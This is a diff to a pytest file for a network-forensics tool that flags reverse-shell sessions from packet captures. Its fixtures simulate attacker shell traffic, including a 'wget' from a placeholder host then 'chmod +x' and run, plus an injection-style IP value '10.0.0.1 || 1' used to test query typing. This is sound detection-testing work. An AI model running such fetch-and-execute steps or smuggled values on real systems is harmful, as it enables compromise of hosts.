@@ -181,7 +181,7 @@ def test_hard_negatives_never_reach_two_indicators(name):
     assert rule(stream_event(a)) == []
 
 
-@pytest.mark.parametrize("prompts, expect", [(2, []), (3, ["prompt"])])
+@pytest.mark.parametrize("prompts, expect", [(2, []), (3, ["bare_prompt"])])
 def test_a_bare_prompt_needs_three_answered_repeats(prompts, expect):
     turns = []
     for _ in range(prompts):
@@ -193,7 +193,7 @@ def test_sh_without_a_terminal_prints_output_after_the_prompt_on_the_same_line()
     turns = [("s2c", b"$ "), ("c2s", b"id\n"), ("s2c", b"uid=0(root) gid=0(root)\n$ "), ("c2s", b"uname\n"),
              ("s2c", b"Linux\n$ "), ("c2s", b"true\n"), ("s2c", b"$ "), ("c2s", b"exit\n")]
     a = analyze(conversation(turns, client=OPERATOR, server=WEB), pk.stream_key(*OPERATOR, *WEB))
-    assert a.kinds == ["output:id", "output:uname", "prompt"]
+    assert a.kinds == ["bare_prompt", "output:id", "output:uname"]
 
 
 def test_the_command_pairing_cap_is_reported_as_a_limit(monkeypatch):
@@ -619,7 +619,7 @@ def test_retrieval_intent_is_typed_and_a_superset_of_what_the_shape_test_accepts
 
     # every document of every connection the local shape test accepts is retrieved (lastPacket is in the window)
     for doc in docs:
-        verdict, _login = hp._shape([d for d in docs if hp._logical(d) == hp._logical(doc)])
+        verdict, _login, _busy = hp._shape([d for d in docs if hp._logical(d) == hp._logical(doc)])
         if verdict == "shaped":
             assert any(all(holds(doc, p) for p in g) for g in intent.any_of), doc["_id"]
 
@@ -645,8 +645,9 @@ def test_a_target_without_the_selection_fields_is_not_applicable_with_the_reason
 
 
 @pytest.mark.parametrize("doc, shaped", [
-    (sdoc("241118-SHORT0000001", VICTIM, ATTACKER, last=T0 - timedelta(seconds=40)), False),      # 20 s long
-    (sdoc("241118-FEWPKT000001", VICTIM, ATTACKER, cpk=10), False),
+    (sdoc("241118-SHORT0000001", VICTIM, ATTACKER, last=T0 - timedelta(seconds=40)), True),       # 20 s long
+    (sdoc("241118-FEWPKT000001", VICTIM, ATTACKER, cpk=10), True),
+    (sdoc("241118-TOOFEW000001", VICTIM, ATTACKER, cpk=3), False),
     (sdoc("241118-BULK00000001", VICTIM, ATTACKER, sb=40 * 1400), False),                       # bulk transfer
     (sdoc("241118-ONEWAY000001", VICTIM, ATTACKER, cb=0), False),
     (sdoc("241118-HTTP00000001", VICTIM, ATTACKER, protocol=("tcp", "http")), False),
@@ -659,8 +660,8 @@ def test_the_interactive_shape(doc, shaped):
 
 
 def test_the_shape_spans_all_documents_of_a_connection():
-    first = sdoc("241118-SEGA00000001", VICTIM, ATTACKER, cpk=12, spk=12, last=T0)
-    second = sdoc("241118-SEGB00000001", VICTIM, ATTACKER, cpk=12, spk=12, last=T0 + timedelta(minutes=12))
+    first = sdoc("241118-SEGA00000001", VICTIM, ATTACKER, cpk=2, spk=2, cb=20, sb=40, last=T0)
+    second = sdoc("241118-SEGB00000001", VICTIM, ATTACKER, cpk=2, spk=2, cb=20, sb=40, last=T0 + timedelta(minutes=12))
     assert hp._shape([first])[0] == "not_shaped" and hp._shape([first, second])[0] == "shaped"
 
 
@@ -894,9 +895,9 @@ def test_a_lone_command_output_is_a_medium_confidence_lead_and_a_lone_prompt_is_
     assert [(x.proposed_lane, x.confidence) for x in m] == [("lead", "medium")]
     prompts = []
     for _ in range(4):
-        prompts += [("s2c", b"www-data@web01:/tmp$ "), ("c2s", b"cd /tmp\n")]
+        prompts += [("s2c", b"$ "), ("c2s", b"cd /tmp\n")]
     lone = _analysis(prompts, OPERATOR, WEB)
-    assert lone.kinds == ["prompt"] and rule(stream_event(lone, client=OPERATOR, server=WEB)) == []
+    assert lone.kinds == ["bare_prompt"] and rule(stream_event(lone, client=OPERATOR, server=WEB)) == []
 
 
 def test_a_lone_login_dialogue_is_nothing():
@@ -915,3 +916,104 @@ def test_the_stage_publishes_a_lone_banner_as_a_lead(tmp_path, monkeypatch):
     repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], {KEY: conversation(BANNER_ONLY, syn="client")})
     assert [(c["lane"], c["confidence"]) for c in _found(repo)] == [("lead", "low")]
     assert summary["streams"][TARGET]["single_indicator"] == 0
+
+
+# ---- merge-gate review: prompt-only shells, short shells, order after retransmission ----------------------------
+
+# A PTY-upgraded reverse shell: full prompts answered with commands whose output has no recognised form.
+PTY_PROMPTS = [("c2s", b"www-data@web01:/var/www/html$ "), ("s2c", b"sudo -l\n"),
+               ("c2s", b"sudo -l\r\n[sudo] password for www-data: \r\nwww-data@web01:/var/www/html$ "),
+               ("s2c", b"cd /tmp\n"), ("c2s", b"cd /tmp\r\nwww-data@web01:/tmp$ "),
+               ("s2c", b"wget -q http://198.51.100.7/x\n"), ("c2s", b"wget -q http://198.51.100.7/x\r\nwww-data@web01:/tmp$ "),
+               ("s2c", b"chmod +x x; ./x &\n")]
+
+
+def test_a_prompt_only_shell_is_a_low_confidence_lead():
+    a = _analysis(PTY_PROMPTS, VICTIM, ATTACKER)
+    assert a.kinds == ["prompt"] and a.side == "client"
+    m = rule(stream_event(a, opened_by="client"))
+    assert [(x.proposed_lane, x.confidence) for x in m] == [("lead", "low")]
+    assert "a single indicator was seen: a shell prompt" in m[0].claim
+
+
+def test_bare_prompts_alone_stay_unpublished():
+    turns = []
+    for _ in range(5):
+        turns += [("s2c", b"$ "), ("c2s", b"cd /tmp\n")]
+    a = _analysis(turns, OPERATOR, WEB)
+    assert a.kinds == ["bare_prompt"] and rule(stream_event(a, client=OPERATOR, server=WEB)) == []
+
+
+@pytest.mark.parametrize("doc", [
+    sdoc("241118-NCSHORT00001", VICTIM, ATTACKER, cpk=9, spk=8, last=T0 - timedelta(seconds=50)),   # nc -e, 10 s
+    sdoc("241118-SCRIPTED0001", VICTIM, ATTACKER, cpk=5, spk=5, last=T0 - timedelta(seconds=58)),   # scripted, 2 s
+])
+def test_short_and_scripted_shells_are_judged(doc, tmp_path, monkeypatch):
+    assert hp._shape([doc])[0] == "shaped"
+    repo, summary = _stage(tmp_path, monkeypatch, [doc], REV_ROWS)
+    assert summary["streams"][TARGET]["judged"] == 1 and [c["lane"] for c in _found(repo)] == ["high"]
+
+
+def test_longer_interactive_connections_rank_ahead_of_short_ones_within_the_cap(tmp_path, monkeypatch):
+    monkeypatch.setattr(hp, "STREAM_MAX_CONNECTIONS", 1)
+    short = sdoc("241118-SHORTFIRST01", VICTIM, ATTACKER, cpk=5, spk=5, first=T0 - timedelta(minutes=30),
+                 last=T0 - timedelta(minutes=30) + timedelta(seconds=2))
+    long_ = sdoc("241118-LONGLATER001", ("172.17.100.122", 50413), ATTACKER, first=T0 - timedelta(minutes=5))
+    calls = []
+    key = pk.stream_key("172.17.100.122", 50413, *ATTACKER)
+    _stage(tmp_path, monkeypatch, [short, long_], {key: conversation(REVERSE, client=("172.17.100.122", 50413))},
+           tshark_calls=calls)
+    assert calls == [key]
+
+
+def test_a_retransmitted_earlier_segment_keeps_each_side_in_byte_order():
+    turns = [*REVERSE[:5], ("c2s", REVERSE[5][1][:40]), ("c2s", REVERSE[5][1][40:])]
+    rows = conversation(turns, syn="client")
+    first_piece = rows[-2]                    # lost, then retransmitted after the second piece
+    first_piece["frame.number"] = ["99"]
+    first_piece["frame.time_epoch"] = [f"{float(rows[-1]['frame.time_epoch'][0]) + 0.2:.6f}"]
+    a = analyze(rows)
+    assert a.kinds == ["output:id", "output:ls", "output:uname"]
+    streams = pk.reassemble_tcp(rows, KEY, 10 ** 6)
+    for d in ("c2s", "s2c"):
+        offsets = [c.offset for c in streams.chunks if c.direction == d]
+        assert offsets == sorted(offsets)
+
+
+def test_every_saved_document_of_a_judged_connection_is_fetched(tmp_path, monkeypatch):
+    quiet = sdoc("241118-QUIETSEG0001", VICTIM, ATTACKER, cpk=1, spk=1, cb=0, sb=0, last=T0 + timedelta(minutes=30))
+    intents, packets = [], _Packets()
+    contract = _contract(**{"source.ip": "ip", "source.port": "long", "destination.ip": "ip",
+                            "destination.port": "long"})
+    monkeypatch.setattr(hp, "_connection_documents", lambda client, target, c, segs: ([quiet, *segs], None))
+    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], REV_ROWS, packets=packets, contract=contract)
+    assert [ids for ids, _b in packets.calls] == [[REV_DOC["_id"]], [quiet["_id"]]]
+    assert "every saved document of a judged connection is read" in _cell(repo)["detail"]["selection"]
+    monkeypatch.setattr(hp, "_connection_documents", lambda client, target, c, segs: ([], "shard_failures"))
+    repo, summary = _stage(tmp_path / "b", monkeypatch, [REV_DOC], REV_ROWS, contract=contract)
+    _partial(repo, summary, "other saved documents could not all be read")
+
+
+def test_the_connection_document_query_is_typed():
+    contract = _contract(**{"source.ip": "ip", "source.port": "long", "destination.ip": "ip",
+                            "destination.port": "long"})
+    seen = []
+
+    def execute(client, intent, c):
+        seen.append(intent)
+        compile_es(intent, c)
+        return SearchOutcome(target=intent.target, fingerprint="f", started_at=T0, ended_at=T0,
+                             completeness=Completeness.complete, total=0, total_relation="eq")
+
+    import romulus.hunt.packets as mod
+    original, mod.execute = mod.execute, execute
+    try:
+        docs, error = hp._connection_documents(None, TARGET, contract, [REV_DOC])
+        bad = sdoc("241118-BADIP0000001", ("10.0.0.1 || 1", 1), ATTACKER)
+        assert hp._connection_documents(None, TARGET, contract, [bad])[1]
+    finally:
+        mod.execute = original
+    assert error is None and len(seen) == 1
+    assert [(p.field, p.value) for p in seen[0].filters] == [("source.ip", VICTIM[0]), ("source.port", VICTIM[1]),
+                                                             ("destination.ip", ATTACKER[0]),
+                                                             ("destination.port", ATTACKER[1])]
